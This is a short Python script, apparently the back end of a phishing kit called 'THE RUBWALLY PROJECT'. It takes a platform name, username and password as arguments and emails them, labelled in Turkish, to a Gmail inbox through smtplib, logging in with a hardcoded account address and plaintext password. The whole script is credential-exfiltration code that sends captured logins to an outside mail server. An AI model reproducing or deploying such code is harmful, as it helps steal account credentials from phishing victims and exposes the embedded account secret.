import sys
import smtplib

platform = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]


def sendMail(to="", sub="", content=""):
    if (to == "" and content == "" and sub == ""):
        to = input("SEND TO >> ")
        sub = input("SUBJECT >> ")
        content = input("CONTENT >> ")
    mail = smtplib.SMTP("smtp.gmail.com", 587)
    mail.ehlo()
    mail.starttls()
    mail.login("rubwally@gmail.com","donttouchthefunc")
    content = 'Subject: {}\n\n{}'.format(sub, content)
    mail.sendmail("rubwally@gmail.com", to, content)
    print("mail gonderildi.")


content = "Platform : "+platform+"\n\nKullanici adi : "+username+"\nSifre : "+password
subject = "THE RUBWALLY PROJECT"

sendMail("rubwally@gmail.com",subject,content)

#print(mail,password)

